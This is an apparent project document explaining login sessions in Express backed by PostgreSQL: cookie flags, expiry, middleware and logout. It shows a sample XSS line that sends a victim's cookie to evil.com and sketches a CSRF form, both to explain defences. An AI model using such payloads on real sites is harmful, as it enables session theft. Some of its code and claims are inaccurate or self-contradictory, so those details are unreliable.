# Session Management - Login Persistence

## What It Is

Sessions let users stay logged in across multiple requests. Without sessions, you'd need to enter email/password on every page load.

## How It Works

### 1. Initial Login

```javascript
// controllers/authController.js
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Check credentials
  const user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
  const validPassword = await bcrypt.compare(password, user.password_hash);
  
  if (validPassword) {
    // Create session (stored in database)
    req.session.userId = user.id;
    req.session.userRole = user.role;
    
    res.redirect('/dashboard');
  }
});
```

**What happens:**
1. Session ID generated: `sid_a1b2c3d4...`
2. Stored in PostgreSQL `session` table with user data
3. Cookie sent to browser: `sessionId=sid_a1b2c3d4; HttpOnly; Secure`

### 2. Subsequent Requests

```javascript
// User visits /dashboard
app.get('/dashboard', requireAuth, (req, res) => {
  // Session middleware automatically runs:
  // 1. Read sessionId cookie from request
  // 2. Query database: SELECT sess FROM session WHERE sid = 'sid_a1b2c3d4'
  // 3. Load session data into req.session
  
  const userId = req.session.userId; // Available on all requests
  // Fetch user data, render dashboard
});
```

**No database query for user on every request** - session data cached in memory after first load.

## Why PostgreSQL Sessions

**In-Memory Sessions (MemoryStore) - Default Express:**
```javascript
app.use(session({
  store: new MemoryStore(), // DON'T USE IN PRODUCTION
  secret: 'abc123'
}));
```

**Problem:**
- Server restart → all sessions lost → everyone logged out
- Multiple servers (load balancing) → sessions don't sync
- Server crashes → data gone

**PostgreSQL Sessions (connect-pg-simple):**
```javascript
app.use(session({
  store: new pgSession({ pool, tableName: 'session' }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    httpOnly: true, // No JavaScript access (XSS protection)
    secure: true, // HTTPS only (production)
    sameSite: 'lax' // CSRF protection
  }
}));
```

**Benefits:**
- Server restart → sessions persist → users stay logged in
- Multiple servers → all read same database → sessions work
- Server crashes → sessions safe in database

## Session Table Structure

```sql
CREATE TABLE session (
  sid VARCHAR NOT NULL PRIMARY KEY,
  sess JSON NOT NULL,
  expire TIMESTAMP(6) NOT NULL
);
```

**Example row:**
```json
{
  "sid": "sid_a1b2c3d4...",
  "sess": {
    "cookie": {
      "originalMaxAge": 604800000,
      "expires": "2026-01-28T10:00:00.000Z",
      "httpOnly": true,
      "secure": true
    },
    "userId": 42,
    "userRole": "user"
  },
  "expire": "2026-01-28 10:00:00"
}
```

PostgreSQL auto-deletes expired sessions (cleanup job runs hourly).

## Authentication Middleware

```javascript
// middleware/auth.js
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.redirect('/login?error=login_required');
  }
  next(); // User logged in, proceed
}

// Usage
app.get('/dashboard', requireAuth, showDashboard);
app.post('/delete-server', requireAuth, deleteServer);
```

Protected routes check session → if no `userId`, redirect to login.

## Session Security

### 1. HttpOnly Cookies
```javascript
cookie: { httpOnly: true }
```

JavaScript can't access cookie → XSS attacks can't steal session.

**Without HttpOnly:**
```javascript
// Attacker injects script
document.cookie; // "sessionId=sid_a1b2c3d4..."
fetch('https://evil.com/steal?cookie=' + document.cookie); // Session stolen
```

**With HttpOnly:**
```javascript
document.cookie; // "" (cookie hidden from JavaScript)
```

### 2. Secure Flag (HTTPS Only)
```javascript
cookie: { secure: process.env.NODE_ENV === 'production' }
```

Session cookie only sent over HTTPS → man-in-the-middle attacks can't intercept.

### 3. SameSite Protection
```javascript
cookie: { sameSite: 'lax' }
```

Prevents CSRF (Cross-Site Request Forgery):
- Attacker creates `evil.com` with form: `<form action="yoursite.com/delete-server">`
- Victim clicks submit → request goes to your site
- **Without SameSite:** Cookie sent → server thinks it's legitimate
- **With SameSite:** Cookie NOT sent → server rejects request

### 4. Session Secret
```javascript
secret: process.env.SESSION_SECRET // Random 256-bit key
```

Signs session cookie cryptographically. Tampering invalidates session.

**Without secret:**
- Attacker changes cookie: `userId=42` → `userId=1` (admin account)
- Server accepts tampered cookie → privilege escalation

**With secret:**
- Cookie signed: `sid_abc.signature_xyz`
- Attacker changes: `userId=42` → `userId=1`
- Signature no longer matches → server rejects

## Session Expiry

```javascript
cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 } // 7 days
```

**Absolute expiry:** Session deleted after 7 days, even if user active.

**Sliding expiry:**
```javascript
rolling: true // Reset expiry on each request
```

User visits site → expiry extended to 7 days from now.

**Our config:**
- 7-day sliding sessions
- Visit dashboard → expiry resets to 7 days from now
- Inactive for 7 days → session expires → must login again

## Memory Considerations

**Problem:** All sessions loaded into memory can consume GB of RAM.

**Solution:** Connection pooling + session cleanup.

```javascript
// db.js
const pool = new Pool({
  max: 20, // Max 20 concurrent connections
  idleTimeoutMillis: 30000 // Close idle connections after 30s
});
```

Each request:
1. Grab connection from pool
2. Load session from database
3. Return connection to pool

RAM usage: ~100 KB per active session (reasonable).

## Logout Implementation

```javascript
app.get('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error('Logout error:', err);
    }
    res.redirect('/?message=Logged out successfully');
  });
});
```

Deletes session from database and clears cookie.

## Customer Value

**User experience:**
- Login once → stay logged in for 7 days
- Close browser → still logged in when returning
- No "session expired" errors mid-workflow

**Security:**
- Sessions can't be stolen via XSS (HttpOnly)
- Sessions can't be intercepted (Secure/HTTPS)
- Sessions can't be forged (cryptographic signature)
- Sessions expire automatically (no stale accounts)

**Reliability:**
- Server restart → users still logged in
- Server crash → sessions preserved
- Load balancing → sessions work across servers

---

Sessions = secure, persistent login state that survives restarts and scales across servers.  
Without PostgreSQL sessions: Everyone logged out on deploy.  
With PostgreSQL sessions: Zero downtime, zero disruption.
